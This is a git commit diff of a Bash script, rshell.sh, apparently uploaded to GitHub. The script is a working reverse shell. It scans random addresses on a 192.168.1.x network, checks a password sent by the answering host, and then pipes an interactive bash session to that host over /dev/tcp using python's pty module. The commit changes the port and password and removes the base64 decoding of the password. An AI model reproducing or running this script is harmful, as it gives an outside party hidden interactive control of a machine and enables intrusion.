b502b5cc8ee1f463936f8996f18e5a6631f0bf6b
bobby-boy49 <63045905+bobby-boy49@users.noreply.github.com>
2026-02-08 22:32:10 -0500

    Add files via upload

--- rshell.sh
+++ rshell.sh
@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 
 ip='192.168.1'
-port='4644'
-pass='MTIzNDU2Nzg5Cg=='
+port='4464'
+pass='d29tYm8='
 
 shell() {
 for i in $(seq 100 255 | shuf); do
@@ -10,7 +10,7 @@ for i in $(seq 100 255 | shuf); do
  (
 if received_pass=$(timeout 0.2 bash -c "exec 3<>/dev/tcp/$com/$port; head -n 1 <&3; exec 3>&-" 2>/dev/null); then
    
-   if [ "$received_pass" == "$(echo $pass | base64 -d)" ]; then
+   if [ "$received_pass" == "$pass" ]; then
       if ! pgrep -f "pty.spawn" > /dev/null; then
          sleep 2.5
          python3 -c 'import pty,os; os.environ["TERM"]="xterm"; pty.spawn(["/bin/bash", "-i"])' >& /dev/tcp/$com/$port 0>&1
